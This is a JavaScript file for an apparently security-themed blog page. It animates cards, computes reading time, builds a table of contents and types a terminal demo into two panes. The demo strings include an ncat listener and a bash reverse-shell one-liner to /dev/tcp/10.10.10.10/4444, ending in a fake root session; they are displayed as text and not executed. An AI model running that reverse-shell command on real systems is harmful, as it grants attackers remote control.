(function(){
  var cards=document.querySelectorAll('.grid .card'); for(var i=0;i<cards.length;i++){ cards[i].style.setProperty('--i', i); cards[i].classList.add('appear'); }
  (function(){ var c=document.querySelector('.post .post-body'); if(!c) return;
    var words=c.textContent.trim().split(/\s+/).length; var rt=document.querySelector('[data-reading-time]'); if(rt){ rt.textContent=Math.max(1,Math.round(words/220))+' min'; }
    var toc=document.querySelector('.toc ul'); if(toc){ toc.innerHTML=''; var hs=c.querySelectorAll('h2,h3'); for(var j=0;j<hs.length;j++){ var h=hs[j]; if(!h.id){ h.id=(h.textContent.trim().toLowerCase().replace(/[^\w]+/g,'-')||'sec')+'-'+j; } var li=document.createElement('li'); li.className='level-'+h.tagName.toLowerCase(); var a=document.createElement('a'); a.href='#'+h.id; a.textContent=h.textContent; li.appendChild(a); toc.appendChild(li);} }
    var kids=c.children; for(var k=0;k<kids.length;k++){ kids[k].style.setProperty('--i', k); kids[k].classList.add('appear'); }
  })();
  (function(){ var A=document.querySelector('[data-ty="a"]'); var B=document.querySelector('[data-ty="b"]'); if(!A||!B) return;
    var seqA=["ncat -lvnp 4444","listening on [any] 4444 ...","connection received from 10.10.10.42","id","uid=0(root) gid=0(root) groups=0(root)"];
    var seqB=["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"];
    function typeLine(el,str,delay){ return new Promise(function(res){ var i=0;(function step(){ if(i<str.length){ el.textContent+=str.charAt(i++); setTimeout(step,delay);} else { el.textContent+="\n"; res(); } })(); }); }
    async function run(){ A.textContent=""; B.textContent=""; await typeLine(A,seqA[0],14); await typeLine(A,seqA[1],10); await typeLine(B,seqB[0],12); await typeLine(A,seqA[2],12); await typeLine(A,seqA[3],14); await typeLine(A,seqA[4],10); }
    if(document.readyState==='loading'){ document.addEventListener('DOMContentLoaded', run); } else { run(); }
  })();
})();
